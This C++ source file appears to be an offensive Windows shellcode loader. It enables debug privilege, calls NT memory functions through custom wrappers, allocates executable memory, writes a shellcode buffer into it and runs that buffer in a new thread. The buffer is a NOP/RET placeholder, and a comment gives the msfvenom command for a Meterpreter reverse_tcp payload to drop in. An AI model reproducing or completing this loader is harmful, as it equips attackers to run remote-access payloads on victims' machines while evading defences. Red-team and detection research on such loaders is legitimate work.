#include "sq.h"

unsigned char shellcode[] = {
    // define your shellcode
    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread 
    // or create you personall shellcode    

    0x90, 0x90, 0xC3
};

int main() {
    if (!EnableDebugPrivilege()) {
        std::cerr << "Failed to enable debug privilege." << std::endl;
        return 1;
    }
    Debug();
    if (!InitNtFunctions()) {
        printf("Failed to initialize NT functions\n");
        return 1;
    }
    Ntdl();
    HMODULE hModule = LoadLibrary(TEXT("ntdll.dll"));
    if (!hModule) {
        std::cerr << "Failed to load DLL." << std::endl;
        return 1;
    }
    PrintDllInfo(hModule);

    processHandle = GetCurrentProcess();
    baseAddress = NULL;
    regionSize = sizeof(shellcode);
    allocationType = MEM_COMMIT | MEM_RESERVE;
    protect = PAGE_EXECUTE_READWRITE;

    NtVirt();
    Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect);
    printf("  [*] Allocated %zu bytes of memory at 0x%p\n", regionSize, baseAddress);

    NtWrite();
    Sq_WriteVirtualMemory(processHandle, baseAddress, shellcode, sizeof(shellcode));
    printf("  [+] Shellcode written to allocated memory\n");

    NtProtect();
    protect = PAGE_EXECUTE_READWRITE;
    Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect);

    PageMemR();
    NtThread();

    Sq_CreateThreadEx(threadHandle, processHandle, baseAddress, p);
    ThdxSc();

    NtObjcect();
    Sq_WaitForSingleObject(threadHandle);

    printf("  [*] Shellcode execution complete\n");
    Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize);

    NtFreeMemory();
    FredMem();
    Ntcose();

    Sq_Close(processHandle);
    printf("  [+] Handles closed\n");
    FreeLibrary(hModule);
    return 1;

}
